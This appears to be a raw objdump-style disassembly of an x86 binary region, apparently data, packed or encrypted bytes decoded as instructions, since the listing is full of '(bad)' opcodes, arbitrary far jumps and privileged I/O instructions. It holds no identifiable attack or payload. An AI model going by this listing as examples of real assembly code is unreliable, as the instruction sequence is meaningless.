  41ae9a:	call   0xda75:0x1984a8d1
  41aea1:	aaa    
  41aea2:	fnstsw ax
  41aea4:	inc    edx
  41aea5:	stos   BYTE PTR es:[edi],al
  41aea6:	push   cs
  41aea7:	push   es
  41aea8:	in     eax,0x70
  41aeaa:	cld    
  41aeab:	mov    eax,0xfbc8ff2e
  41aeb0:	fisttp QWORD PTR ds:0xd6282e92
  41aeb6:	mov    esi,0xa0f1f7f7
  41aebb:	repz cmc 
  41aebd:	push   ebx
  41aebe:	adc    BYTE PTR [esi-0x48],cl
  41aec1:	mov    edx,0x9dd2c31b
  41aec6:	sti    
  41aec7:	jmp    0xc07e:0xdcf8d62
  41aece:	jg     0x41aeaa
  41aed0:	gs in  al,dx
  41aed2:	adc    BYTE PTR [ebx+0x436d6d31],al
  41aed8:	xchg   esi,eax
  41aed9:	sbb    esp,DWORD PTR [ebx-0x4c783a56]
  41aedf:	mov    ch,0xa2
  41aee1:	les    edx,FWORD PTR [ebp-0x58]
  41aee4:	sbb    eax,0xe50167bf
  41aee9:	neg    BYTE PTR [eax-0x47efd418]
  41aeef:	call   0xccbe:0x56a210aa
  41aef6:	ret    0x5e51
  41aef9:	xchg   ebx,eax
  41aefa:	in     al,0xbb
  41aefc:	or     edi,DWORD PTR cs:[esi-0x61]
  41af00:	or     BYTE PTR [edi+0x2d7b6304],ch
  41af06:	add    ebp,DWORD PTR [edx]
  41af08:	ds push esi
  41af0a:	jb     0x41af6f
  41af0c:	mov    ch,0x18
  41af0e:	icebp  
  41af0f:	mov    ?,WORD PTR [esp+ecx*1+0x7c]
  41af13:	(bad)  
  41af14:	push   eax
  41af15:	retf   0x237a
  41af18:	and    al,0x9d
  41af1a:	daa    
  41af1b:	js     0x41aecb
  41af1d:	int3   
  41af1e:	mov    esi,0x5c141b6e
  41af23:	mov    edi,DWORD PTR [edx+0x271a7fdd]
  41af29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af2a:	mov    ebx,0x92c396f
  41af2f:	sbb    bh,BYTE PTR [edx+ebx*1+0x56f196a]
  41af36:	(bad)  
  41af38:	pop    edi
  41af39:	xor    BYTE PTR [edx+0x13c14a47],0x41
  41af40:	call   0x8214:0xd5e89c93
  41af47:	sub    ebp,DWORD PTR [ebx-0x2d]
  41af4a:	cmp    DWORD PTR [ecx-0x52be05d8],esi
  41af50:	cmpps  xmm5,xmm7,0x4c
  41af54:	in     al,dx
  41af55:	ficom  DWORD PTR [edx]
  41af57:	xor    al,BYTE PTR [eax-0x4979ac71]
  41af5d:	sbb    bh,BYTE PTR [edx-0x51d6e521]
  41af63:	cdq    
  41af64:	lods   al,BYTE PTR ds:[esi]
  41af65:	cdq    
  41af66:	mov    edx,0xbe250a33
  41af6b:	inc    esp
  41af6c:	iret   
  41af6d:	test   edi,ecx
  41af6f:	(bad)
  41af72:	enter  0x4f0a,0xe8
  41af76:	repz dec eax
  41af78:	xor    BYTE PTR [esi-0x55],ch
  41af7b:	cmp    BYTE PTR [eax],ah
  41af7d:	imul   ecx,DWORD PTR [edx-0x228dd8],0xb3cb17d6
  41af87:	and    cl,dh
  41af89:	xchg   edi,eax
  41af8a:	mov    cl,0xb7
  41af8c:	popa   
  41af8d:	adc    eax,0xfda60952
  41af92:	xor    WORD PTR [edi+esi*4+0x68cc5f97],si
  41af9a:	je     0x41af6c
  41af9c:	loope  0x41af8b
  41af9e:	dec    ebx
  41af9f:	push   0xef30cb7f
  41afa4:	mov    ebx,0xa75d9129
  41afa9:	cmp    edx,esp
  41afab:	imul   edx,DWORD PTR [edi],0xcf531a54
  41afb1:	xchg   ebp,eax
  41afb2:	add    eax,0xf475a124
  41afb7:	test   dl,dl
  41afb9:	into   
  41afba:	mov    bl,0x73
  41afbc:	xlat   BYTE PTR gs:[ebx]
  41afbe:	daa    
  41afbf:	mov    dh,0xa
  41afc1:	inc    ebp
  41afc2:	mov    ebx,0x61411cac
  41afc7:	xchg   esp,ecx
  41afc9:	inc    edx
  41afca:	xlat   BYTE PTR ds:[ebx]
  41afcb:	mov    bl,0xd9
  41afcd:	sub    ecx,DWORD PTR [ebx+0x42beb532]
  41afd3:	fwait
  41afd4:	lock inc edi
  41afd6:	sub    DWORD PTR [ecx+edx*1+0x66017939],esi
  41afdd:	out    0x8f,al
  41afdf:	and    BYTE PTR [edi+0x2b71f32b],bh
  41afe5:	fiadd  DWORD PTR [edi]
  41afe7:	rcr    BYTE PTR [ebx],cl
  41afe9:	neg    DWORD PTR [bx+di]
  41afec:	out    dx,al
  41afed:	and    esi,esp
  41afef:	cdq    
  41aff0:	pop    ebp
  41aff1:	push   eax
  41aff2:	gs jmp 0xfc49:0xcfed2b3f
  41affa:	pop    esi
  41affb:	xchg   esp,eax
  41affc:	dec    ecx
  41affd:	add    esi,DWORD PTR [esp+eiz*4-0x6f3272a]
  41b004:	mov    bh,0xbd
  41b006:	cmp    DWORD PTR [ebp-0x6b],esp
  41b009:	pop    es
  41b00a:	sub    esi,edi
  41b00c:	add    eax,0xd87c95ff
  41b011:	mov    ah,0x4f
  41b013:	mov    ch,0x77
  41b015:	mov    ebx,0x1b536101
  41b01a:	sub    DWORD PTR [ebx+0x57],ebp
  41b01d:	in     al,0x91
  41b01f:	icebp  
  41b020:	adc    BYTE PTR [edx],bh
  41b022:	xor    bh,0xc2
  41b025:	adc    DWORD PTR [ebx-0x45400d8],esp
  41b02b:	mov    bh,0x65
  41b02d:	dec    esp
  41b02e:	push   ds
  41b02f:	xchg   ebx,eax
  41b030:	mov    ds:0x9dff274d,al
  41b035:	fwait
  41b036:	xchg   ecx,eax
  41b037:	sbb    BYTE PTR ds:0xc42c93b4,dh
  41b03d:	and    dl,BYTE PTR [ebx]
  41b03f:	scas   al,BYTE PTR es:[edi]
  41b040:	aam    0xfc
  41b042:	xchg   esp,eax
  41b043:	push   0x7a
  41b045:	xor    al,0xd8
  41b047:	push   esp
  41b048:	jle    0x41b009
  41b04a:	mov    bh,0x31
  41b04c:	push   0x16
  41b04e:	dec    eax
  41b04f:	and    al,0xbb
  41b051:	adc    edx,eax
  41b053:	sbb    al,0xe1
  41b055:	rsqrtps xmm1,XMMWORD PTR [edi+0x361989be]
  41b05c:	push   0xffffffb7
  41b05e:	aad    0xfb
  41b060:	dec    eax
  41b061:	and    BYTE PTR [edi],bh
  41b063:	pop    es
  41b064:	cmp    DWORD PTR [ebp+0x72],ebx
  41b067:	pop    ecx
  41b068:	data16 cmc 
  41b06a:	stos   BYTE PTR es:[edi],al
  41b06b:	mov    ebx,0x34b2f928
  41b070:	cmp    BYTE PTR [edi+0x5ce2fdb5],dh
  41b076:	jmp    0x9460:0xa90c3a07
  41b07d:	cmp    eax,0x5783b900
  41b082:	mov    DWORD PTR ds:0x7e1ddc3a,esi
  41b088:	mov    ecx,0xb2d9e4ad
  41b08d:	das    
  41b08e:	sbb    bl,BYTE PTR [edx-0x2a7668d7]
  41b094:	push   es
  41b095:	sub    DWORD PTR [ecx],0x96ff418f
  41b09b:	add    DWORD PTR [ebx],ecx
  41b09d:	aad    0x7f
  41b09f:	addr16 pop esi
  41b0a1:	jg     0x41b05f
  41b0a3:	out    0x3d,eax
  41b0a5:	bound  esp,QWORD PTR [edi+0x19]
  41b0a8:	scas   eax,DWORD PTR es:[edi]
  41b0a9:	sub    dh,dh
  41b0ab:	sub    al,0xee
  41b0ad:	das    
  41b0ae:	aad    0xb2
  41b0b0:	jp     0x41b06b
  41b0b2:	jge    0x41b05b
  41b0b4:	inc    ecx
  41b0b5:	pop    ebp
  41b0b6:	test   DWORD PTR [esi+0x70],0x5f109b5b
  41b0bd:	in     eax,dx
  41b0be:	dec    esi
  41b0bf:	mov    dh,0xd2
  41b0c1:	fnstcw WORD PTR [edx-0x9]
  41b0c4:	add    DWORD PTR [ebp+0x52966de2],0x9810ca14
  41b0ce:	dec    edx
  41b0cf:	into   
  41b0d0:	hlt    
  41b0d1:	mov    edx,0x8d27c0ce
  41b0d6:	rcl    BYTE PTR [edx],cl
  41b0d8:	push   0x9a5536ca
  41b0dd:	cmp    BYTE PTR [eax+0x55],0xf6
  41b0e1:	jge    0x41b126
  41b0e3:	popa   
  41b0e4:	ds scas eax,DWORD PTR es:[edi]
  41b0e6:	xor    eax,0x7c9d27cd
  41b0eb:	(bad)  
  41b0ec:	add    eax,0xe5505d59
  41b0f1:	bound  eax,QWORD PTR [esi+esi*1-0x19ef7629]
  41b0f8:	repnz test ebp,0xb72b63dc
  41b0ff:	lods   eax,DWORD PTR ds:[esi]
  41b100:	cs push edi
  41b102:	cmp    al,0xe6
  41b104:	and    dh,bl
  41b106:	jmp    0x41b0dd
  41b108:	ja     0x7069459b
  41b10e:	sbb    DWORD PTR [edx],eax
  41b110:	mov    ecx,0xad9a49d6
  41b115:	xor    al,0x84
  41b117:	cli    
  41b118:	test   bl,ah
  41b11a:	and    BYTE PTR [edi],ah
  41b11c:	inc    eax
  41b11d:	jo     0x41b160
  41b11f:	jecxz  0x41b159
  41b121:	mov    bl,BYTE PTR [eiz*4-0x3ceaafd8]
  41b128:	pop    edx
  41b129:	cmp    bl,BYTE PTR [eax+0x1e]
  41b12c:	sbb    al,0x4b
  41b12e:	ret    
  41b12f:	or     BYTE PTR [ebx+0x43],cl
  41b132:	fbld   TBYTE PTR [ebp-0x7e]
  41b135:	mov    cl,0x38
  41b137:	vcmppd xmm5,xmm4,xmm0,0xed
  41b13c:	loope  0x41b1a7
  41b13e:	mov    cl,0x96
  41b140:	sub    al,0xd1
  41b142:	mov    bl,0x75
  41b144:	je     0x41b1b0
  41b146:	out    0xb3,eax
  41b148:	sub    al,0xbd
  41b14a:	pop    ecx
  41b14b:	and    BYTE PTR [ebp-0x37],bl
  41b14e:	and    ch,BYTE PTR [esi+0x49a4cc28]
  41b154:	jns    0x41b163
  41b156:	mov    ebx,eax
  41b158:	mov    al,0x62
  41b15a:	ror    DWORD PTR [eax-0x28],0x11
  41b15e:	or     ah,BYTE PTR [edi+0x2217300e]
  41b164:	test   esi,esp
  41b166:	daa    
  41b167:	retf   0xbc74
  41b16a:	loop   0x41b13f
  41b16c:	dec    eax
  41b16d:	dec    ebp
  41b16e:	sar    DWORD PTR [ebp+0x6e],0xba
  41b172:	sub    ebp,DWORD PTR [ebx+0x1969ec8a]
  41b178:	aad    0xef
  41b17a:	icebp  
  41b17b:	cmc    
  41b17c:	inc    ebp
  41b17d:	sbb    al,0xc3
  41b17f:	aas    
  41b180:	fwait
  41b181:	inc    esi
  41b182:	mov    ds:0xbcf9194b,eax
  41b187:	shr    dl,cl
  41b189:	xchg   edi,eax
  41b18a:	push   eax
  41b18b:	out    dx,eax
  41b18c:	pop    ss
  41b18d:	fdivr  DWORD PTR [edi-0x7b8f1800]
  41b193:	in     al,dx
  41b194:	adc    al,0xcd
  41b196:	ret    0x8fa4
  41b199:	dec    eax
  41b19a:	add    al,BYTE PTR [edi]
  41b19c:	inc    esi
  41b19d:	jecxz  0x41b146
  41b19f:	cmp    eax,0xd7eb1273
  41b1a4:	ror    BYTE PTR [ecx],cl
  41b1a6:	fisttp WORD PTR [edi-0x75]
  41b1a9:	mov    eax,ds:0x974cf3e9
  41b1ae:	inc    eax
  41b1af:	js     0x41b140
  41b1b1:	loope  0x41b202
  41b1b3:	popa   
  41b1b4:	and    BYTE PTR [ebp-0x13],al
  41b1b7:	and    DWORD PTR [edx],ecx
  41b1b9:	sti    
  41b1ba:	js     0x41b1c8
  41b1bc:	sbb    DWORD PTR [ebx+edi*4-0x70],0x3d
  41b1c1:	fist   WORD PTR [edx]
  41b1c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1c4:	data16 fwait
  41b1c6:	xor    eax,0xe857da5f
  41b1cb:	fwait
  41b1cc:	inc    eax
  41b1cd:	cmp    ebx,eax
  41b1cf:	nop
  41b1d0:	mov    ecx,0x87826088
  41b1d5:	add    ah,BYTE PTR ds:0x93f36189
  41b1db:	pop    esi
  41b1dc:	retf   
  41b1dd:	sub    ebp,ebp
  41b1df:	xchg   BYTE PTR [ebx+edi*4+0x8d19e28],dl
  41b1e6:	add    eax,0xecdce654
  41b1eb:	sbb    dl,0xe8
  41b1ee:	inc    esp
  41b1ef:	leave  
  41b1f0:	xor    ch,ah
  41b1f2:	jbe    0x41b270
  41b1f4:	stos   DWORD PTR es:[edi],eax
  41b1f5:	inc    esp
  41b1f6:	xchg   esi,eax
  41b1f7:	xchg   esp,eax
  41b1f8:	lods   eax,DWORD PTR ds:[esi]
  41b1f9:	mov    eax,0xa2d0e049
  41b1fe:	bound  ecx,QWORD PTR [ecx-0x78]
  41b201:	(bad)  
  41b202:	ss mov esi,0xec31c37c
  41b208:	jnp    0x41b233
  41b20a:	xchg   ebx,eax
  41b20b:	mov    dl,0xa7
  41b20d:	inc    ebx
  41b20e:	call   0xfaf18be6
  41b213:	scas   eax,DWORD PTR es:[edi]
  41b214:	fisubr WORD PTR [edi]
  41b216:	daa    
  41b217:	jae    0x41b212
  41b219:	jg     0x41b270
  41b21b:	sahf   
  41b21c:	enter  0x312e,0x17
  41b220:	dec    esi
  41b221:	dec    edx
  41b222:	fist   DWORD PTR [eax]
  41b224:	sahf   
  41b225:	mov    fs,WORD PTR [ebx+0x2a1e7c67]
  41b22b:	cdq    
  41b22c:	mov    esi,0xde2c28de
  41b231:	fcmovnb st,st(1)
  41b233:	mov    edx,?
  41b235:	out    dx,eax
  41b236:	inc    ebx
  41b237:	in     eax,dx
  41b238:	fwait
  41b239:	pop    ebx
  41b23a:	push   edx
  41b23b:	cwd    
  41b23d:	add    eax,eax
  41b23f:	xchg   edx,eax
  41b240:	push   ecx
  41b241:	rol    DWORD PTR gs:[ecx+0x6793b521],0x4c
  41b249:	sbb    eax,0x458e039f
  41b24e:	mov    ebp,?
  41b250:	xchg   esi,eax
  41b251:	jne    0x41b20f
  41b253:	mov    ebx,0x6dc1dd36
  41b258:	mov    eax,ds:0x92e68ec3
  41b25d:	cs sub al,0xb5
  41b260:	pushf  
  41b261:	push   0xffffffb3
  41b263:	or     edi,DWORD PTR [edx-0x5de3928f]
  41b269:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b26a:	call   0x2f1399ad
  41b26f:	inc    esi
  41b270:	fistp  QWORD PTR [edi]
  41b272:	lea    ebp,[edx-0x45711425]
  41b278:	(bad)  
  41b27a:	test   al,0x8f
  41b27c:	jmp    FWORD PTR [edi]
  41b27e:	in     eax,0xbf
  41b280:	out    dx,eax
  41b281:	push   edx
  41b282:	test   DWORD PTR [esp+edx*8],ebp
  41b285:	outs   dx,BYTE PTR ds:[esi]
  41b286:	shr    BYTE PTR [edi],cl
  41b288:	enter  0xdbbe,0x56
  41b28c:	jmp    DWORD PTR [ecx]
  41b28e:	xor    ch,BYTE PTR [ecx+0x48]
  41b291:	ret    0xf5e4
  41b294:	dec    esi
  41b295:	inc    eax
  41b296:	ficomp DWORD PTR [edi-0x4969b555]
  41b29c:	int3   
  41b29d:	lods   eax,DWORD PTR ds:[esi]
  41b29e:	dec    esi
  41b29f:	push   0x197daae2
  41b2a4:	xchg   edx,eax
  41b2a5:	push   ecx
  41b2a6:	jg     0x41b228
  41b2a8:	pop    ss
  41b2a9:	dec    ebx
  41b2aa:	jge    0x41b303
  41b2ac:	push   0x8b6847b1
  41b2b1:	in     eax,0x2c
  41b2b3:	fcmovnbe st,st(5)
  41b2b5:	cld    
  41b2b6:	sub    dl,ah
  41b2b8:	jge    0x41b253
  41b2ba:	fiadd  DWORD PTR [eax]
  41b2bc:	lods   eax,DWORD PTR ds:[esi]
  41b2bd:	xchg   ebx,eax
  41b2be:	cmp    edx,DWORD PTR [ebx-0x17ede571]
  41b2c4:	sub    eax,0x719b2bf3
  41b2c9:	out    dx,eax
  41b2ca:	jge    0x41b2e6
  41b2cc:	call   0x387c:0x2b1e110c
  41b2d3:	repnz sbb eax,ebp
  41b2d6:	jge    0x41b30a
  41b2d8:	mov    ecx,0x7e079d03
  41b2dd:	sub    al,0xd6
  41b2e0:	loope  0x41b2d9
  41b2e2:	or     ebp,edx
  41b2e4:	inc    esi
  41b2e5:	push   ebx
  41b2e6:	(bad)  [ecx]
  41b2e8:	jmp    0x41b2e3
  41b2ea:	or     eax,0xc2eaf9a8
  41b2ef:	mov    cl,0x49
  41b2f1:	popf   
  41b2f2:	pop    edi
  41b2f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2f4:	imul   ecx,DWORD PTR [ebx-0x3c],0xc4d98c3d
  41b2fb:	stos   BYTE PTR es:[edi],al
  41b2fc:	adc    eax,0x45ff8441
  41b301:	in     al,dx
  41b302:	into   
  41b303:	in     eax,dx
  41b304:	jle    0x41b320
  41b306:	mov    bl,0x72
  41b308:	pushw  es
  41b30a:	mov    gs,esi
  41b30c:	mov    ch,0xc1
  41b30e:	fs rcl ecx,1
  41b311:	inc    eax
  41b312:	in     al,0x2f
  41b314:	je     0x41b395
  41b316:	push   ss
  41b317:	sbb    edx,DWORD PTR [edi-0x7a9c5c1d]
  41b31d:	shl    DWORD PTR [ebx+ebx*4+0x57],0xf7
  41b322:	(bad)  
  41b323:	test   DWORD PTR ds:0xc0413c20,edx
  41b329:	and    bl,BYTE PTR [ebp+0x2c5c288f]
  41b32f:	xor    ecx,eax
  41b331:	repz mov eax,ds:0xd7a4215
  41b337:	lahf   
  41b338:	sub    al,0x20
  41b33a:	icebp  
  41b33b:	pop    ds
  41b33c:	push   0xc158f64b
  41b341:	repz xor al,BYTE PTR [esi-0xc]
  41b345:	pop    ebx
  41b346:	test   DWORD PTR [esi],ebx
  41b348:	adc    BYTE PTR [eax],ah
  41b34a:	inc    ecx
  41b34b:	push   0xb2497591
  41b350:	fwait
  41b351:	pushf  
  41b352:	adc    BYTE PTR [edi],bl
  41b354:	nop
  41b355:	adc    ecx,DWORD PTR ds:0x707b807e
  41b35b:	mov    ds:0x9b8001fd,eax
  41b360:	ret    
  41b361:	xchg   BYTE PTR [edx+0x56],cl
  41b364:	inc    esp
  41b365:	sbb    eax,DWORD PTR [ebp-0x63]
  41b368:	lods   al,BYTE PTR ds:[esi]
  41b369:	xor    eax,0xec601d91
  41b36e:	or     DWORD PTR [esi+0x5e],eax
  41b371:	(bad)  
  41b372:	ret    
  41b373:	leave  
  41b374:	aas    
  41b375:	xchg   DWORD PTR [ebx+0x30],edi
  41b378:	(bad)  
  41b37a:	push   cs
  41b37b:	sbb    eax,edi
  41b37d:	lods   eax,DWORD PTR ds:[esi]
  41b37e:	sahf   
  41b37f:	into   
  41b380:	mov    bh,BYTE PTR [ebp-0xfd193b]
  41b386:	sbb    BYTE PTR [edx+edx*1],cl
  41b389:	(bad)  
  41b38a:	sbb    DWORD PTR [edx+0x6e],eax
  41b38d:	outs   dx,DWORD PTR es:[esi]
  41b38f:	mov    ds:0xa581fe62,eax
  41b394:	arpl   WORD PTR [ebp-0xc],bx
  41b397:	mov    ebx,0xf535c936
  41b39c:	push   ebx
  41b39d:	jg     0x41b355
  41b39f:	std    
  41b3a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3a1:	dec    edi
  41b3a2:	je     0x41b388
  41b3a4:	(bad)  
  41b3a5:	push   edx
  41b3a6:	inc    eax
  41b3a7:	jnp    0x41b3a2
  41b3a9:	sahf   
  41b3aa:	mov    bh,0x82
  41b3ac:	test   al,0xe4
  41b3ae:	mov    dh,0xae
  41b3b0:	test   al,0x30
  41b3b2:	fwait
  41b3b3:	sub    DWORD PTR [edx],edx
  41b3b5:	lds    esi,FWORD PTR [edi]
  41b3b7:	cmp    BYTE PTR [esi],cl
  41b3b9:	cli    
  41b3ba:	stos   BYTE PTR es:[edi],al
  41b3bb:	jno    0x41b381
  41b3bd:	and    esp,DWORD PTR [ebx-0x265f489b]
  41b3c3:	inc    edx
  41b3c4:	mov    ebx,0xc51791ea
  41b3c9:	aad    0xab
  41b3cb:	ds scas eax,DWORD PTR es:[edi]
  41b3cd:	imul   edx,DWORD PTR cs:[esi-0x6e],0xe9d5186e
  41b3d5:	mov    ds:0x24cd5ea4,eax
  41b3da:	mov    ds:0x6ca19cbf,al
  41b3df:	inc    edi
  41b3e0:	jmp    0x41b437
  41b3e2:	mov    bl,0xae
  41b3e4:	xor    dl,al
  41b3e6:	(bad)  
  41b3e7:	retf   
  41b3e8:	imul   eax,edi,0xdce5d810
  41b3ee:	shl    DWORD PTR [edx-0x71c55694],1
  41b3f4:	push   0x41676c5a
  41b3f9:	ds cli 
  41b3fb:	(bad)  
  41b3fd:	fmul   DWORD PTR ds:0x1d30c151
  41b403:	mov    bl,0x62
  41b405:	mov    ecx,0xc4149d66
  41b40a:	loope  0x41b44c
  41b40c:	jnp    0x41b3c4
  41b40e:	daa    
  41b40f:	sub    ebp,DWORD PTR cs:[ebx+0x1fd50545]
  41b416:	cmp    BYTE PTR [eax+0x2d42ff80],bh
  41b41c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b41d:	push   0xd3d98858
  41b422:	outs   dx,BYTE PTR ds:[esi]
  41b423:	mov    ds:0x514d7319,al
  41b428:	push   0xc5d0447b
  41b42d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b42e:	adc    BYTE PTR [edx-0x7a61a86d],bl
  41b434:	adc    al,0xcb
  41b436:	hlt    
  41b437:	outs   dx,BYTE PTR ds:[esi]
  41b438:	xchg   ebx,eax
  41b439:	test   eax,0x558f4295
  41b43e:	mov    dl,0xed
  41b440:	jae    0x41b44c
  41b442:	nop
  41b443:	push   0xe
  41b445:	sub    eax,0x8330f41d
  41b44a:	push   0x583968c1
  41b44f:	mov    ah,0x49
  41b451:	jnp    0x41b4aa
  41b453:	cld    
  41b454:	jmp    0xde9a5de5
  41b459:	xor    ecx,esi
  41b45b:	cwde   
  41b45c:	xchg   edx,eax
  41b45d:	push   0x55
  41b45f:	pop    ds
  41b460:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b461:	pop    ebp
  41b462:	sub    ah,BYTE PTR [esi-0x6c2adf9b]
  41b468:	sti    
  41b469:	stos   DWORD PTR es:[edi],eax
  41b46a:	dec    esi
  41b46b:	scas   eax,DWORD PTR es:[edi]
  41b46c:	adc    bh,BYTE PTR [ebp+0x684dfcf2]
  41b472:	ds repnz xchg esp,eax
  41b475:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b476:	scas   al,BYTE PTR es:[edi]
  41b477:	push   ecx
  41b478:	cld    
  41b479:	sub    eax,0x528bd0ee
  41b47e:	aas    
  41b47f:	mov    ah,0x27
  41b481:	xchg   BYTE PTR [ecx+esi*8-0x48],ch
  41b485:	int    0xfb
  41b487:	mov    al,0x7d
  41b489:	cs sbb eax,esp
  41b48c:	xor    ebx,esi
  41b48e:	hlt    
  41b48f:	loopne 0x41b4a1
  41b491:	pop    eax
  41b492:	sub    eax,0x103634b3
  41b497:	adc    ebp,esp
  41b499:	test   BYTE PTR [ebx+ebp*2],bh
  41b49c:	fcmove st,st(6)
  41b49e:	fidiv  WORD PTR [ebp-0x1a79eee5]
  41b4a4:	mov    eax,0x3805d85c
  41b4a9:	mov    cl,0x1c
  41b4ab:	out    dx,al
  41b4ac:	sahf   
  41b4ad:	dec    esi
  41b4ae:	repnz scas eax,DWORD PTR es:[edi]
  41b4b0:	fwait
  41b4b1:	add    eax,DWORD PTR [edi-0x48]
  41b4b4:	sbb    ebp,ebx
  41b4b6:	jmp    0x2f7d:0x2b0075b7
  41b4bd:	retf   0x89f7
  41b4c0:	xor    al,bh
  41b4c2:	jmp    0x5c078829
  41b4c7:	retf   
  41b4c8:	jnp    0x41b4db
  41b4ca:	jg     0x41b473
  41b4cc:	test   eax,0xf1b8f2a1
  41b4d1:	fcomp  QWORD PTR [ecx+eiz*1-0x42]
  41b4d5:	dec    ecx
  41b4d6:	push   0xfcfb03a3
  41b4db:	xor    eax,0xaa35dc8a
  41b4e0:	jne    0x41b534
  41b4e2:	xor    BYTE PTR [eax],ch
  41b4e4:	out    0x54,eax
  41b4e6:	or     DWORD PTR [esi+0x3fe23bc0],ecx
  41b4ec:	mov    BYTE PTR [ebp-0x9f48625],0xa6
  41b4f3:	fcomp  DWORD PTR [esp+edx*8]
  41b4f6:	adc    DWORD PTR [eax+esi*1+0x6c112f2],ecx
  41b4fd:	outs   dx,DWORD PTR ds:[esi]
  41b4fe:	and    cl,BYTE PTR [edx]
  41b500:	adc    BYTE PTR [edx],dl
  41b502:	std    
  41b503:	xchg   DWORD PTR [edx+0x5d1b446],eax
  41b509:	push   esi
  41b50a:	pop    edx
  41b50b:	and    al,0x80
  41b50d:	lds    esp,FWORD PTR [esp+ebx*1-0x61]
  41b511:	pusha  
  41b512:	scas   eax,DWORD PTR es:[edi]
  41b513:	frstor [edi+eiz*1]
  41b516:	or     al,0x72
  41b518:	call   0xc7819789
  41b51d:	popw   es
  41b51f:	lods   al,BYTE PTR ds:[esi]
  41b520:	cdq    
  41b521:	(bad)  
  41b522:	xchg   al,ah
  41b524:	push   edx
  41b525:	addr16 shl ebx,1
  41b528:	(bad)  
  41b529:	adc    DWORD PTR [ebx],ebx
  41b52b:	or     al,0x1
  41b52d:	lods   eax,DWORD PTR es:[esi]
  41b52f:	xor    al,0xdf
  41b531:	mov    al,0xe2
  41b533:	aaa    
  41b534:	pop    esp
  41b535:	xchg   esp,eax
  41b536:	(bad)  [edi+0x4cb7888d]
  41b53c:	aam    0x22
  41b53e:	adc    BYTE PTR [ecx-0x34],cl
  41b541:	cmp    DWORD PTR [esi],0x4bedd86e
  41b547:	xchg   edi,eax
  41b548:	mov    esi,0x171d7aca
  41b54d:	or     ebp,DWORD PTR [ebp+0x10bc8134]
  41b553:	rcl    BYTE PTR [edi+ecx*8-0x4b7182d1],cl
  41b55a:	fisub  DWORD PTR [eax-0x1a]
  41b55d:	jl     0x41b5c4
  41b55f:	mov    edi,0x1ab092f1
  41b564:	sbb    ah,BYTE PTR [ebp+0x1658c14d]
  41b56a:	cmp    al,0x37
  41b56c:	push   0xf57e0a5d
  41b571:	jge    0x41b5e9
  41b573:	retf   
  41b574:	fist   DWORD PTR [edx-0x2c]
  41b577:	into   
  41b578:	pop    es
  41b579:	bswap  edx
  41b57b:	dec    BYTE PTR [bx+0x24]
  41b57f:	nop
  41b580:	(bad)  
  41b581:	sub    eax,0xf88295c3
  41b586:	mov    BYTE PTR [ebp+0x27e32fc7],ah
  41b58c:	rcr    WORD PTR [edx],1
  41b58f:	adc    ah,BYTE PTR [ebx]
  41b591:	and    BYTE PTR [ecx+0x68019dd9],al
  41b597:	shr    DWORD PTR [ebp-0x75],cl
  41b59a:	push   0xd36ad922
  41b59f:	les    ebx,FWORD PTR [esp+edx*4]
  41b5a2:	or     DWORD PTR [ebx-0x52],edi
  41b5a5:	or     BYTE PTR [esi+0x70],0xf6
  41b5a9:	stos   BYTE PTR es:[edi],al
  41b5aa:	sbb    eax,0xd9eb7ea3
  41b5af:	or     DWORD PTR [ebx],edi
  41b5b1:	mov    esi,0xb1fc7ff5
  41b5b6:	int3   
  41b5b7:	mov    cl,0x5e
  41b5b9:	stos   BYTE PTR es:[edi],al
  41b5ba:	inc    edx
  41b5bb:	xchg   edi,eax
  41b5bc:	cwde   
  41b5bd:	into   
  41b5be:	or     esi,ebp
  41b5c0:	out    0xf2,al
  41b5c2:	out    0xd6,al
  41b5c4:	mov    edx,0xcf72d77e
  41b5c9:	data16 test al,bh
  41b5cc:	sahf   
  41b5cd:	cmc    
  41b5ce:	and    DWORD PTR [ebx-0x47e06403],esp
  41b5d4:	push   eax
  41b5d5:	scas   al,BYTE PTR es:[edi]
  41b5d6:	(bad)  
  41b5d7:	gs inc ebp
  41b5d9:	mov    cs,eax
  41b5db:	popa   
  41b5dc:	clc    
  41b5dd:	mov    dl,0xfd
  41b5df:	lds    ebx,FWORD PTR [eax+0x6e]
  41b5e2:	loop   0x41b5cb
  41b5e4:	push   esi
  41b5e5:	shl    DWORD PTR [ecx+0x63bd11f7],0xa7
  41b5ec:	mov    eax,ds:0xa8ed983c
  41b5f1:	inc    eax
  41b5f2:	mov    esi,0xd01535ad
  41b5f7:	outs   dx,DWORD PTR ds:[esi]
  41b5f8:	xor    al,0x16
  41b5fa:	jnp    0x41b5db
  41b5fc:	or     eax,0xa37a44a1
  41b601:	mov    ah,0xd3
  41b603:	outs   dx,BYTE PTR ds:[esi]
  41b604:	push   ds
  41b605:	js     0x41b5c2
  41b607:	rol    cl,0x42
  41b60a:	aam    0x9
  41b60c:	rcr    ebx,0x7f
  41b60f:	mov    ecx,0xf188997d
  41b614:	jmp    0x41b5ca
  41b616:	pop    ebp
  41b617:	xchg   esi,eax
  41b618:	pushf  
  41b619:	pop    esi
  41b61a:	dec    edi
  41b61b:	push   ds
  41b61c:	aad    0x78
  41b61e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b61f:	mov    esp,0x1af303b7
  41b624:	addr16 ja 0x41b5d1
  41b627:	mov    dh,dl
  41b629:	xchg   esp,eax
  41b62a:	push   edx
  41b62b:	pop    esp
  41b62c:	retf   
  41b62d:	pop    ecx
  41b62e:	push   ecx
  41b62f:	daa    
  41b630:	mov    eax,0xc3607a37
  41b635:	mov    al,ds:0x48eb80be
  41b63a:	mov    eax,es:0xabc33fd5
  41b640:	jg     0x41b601
  41b642:	test   eax,0xe044389b
  41b647:	mov    cl,0x66
  41b649:	dec    ecx
  41b64a:	sar    DWORD PTR [ecx],1
  41b64c:	pop    ebp
  41b64d:	retf   0xf48d
  41b650:	jbe    0x41b614
  41b652:	lods   eax,DWORD PTR ds:[esi]
  41b653:	fsubr  st,st(5)
  41b655:	jbe    0x41b60f
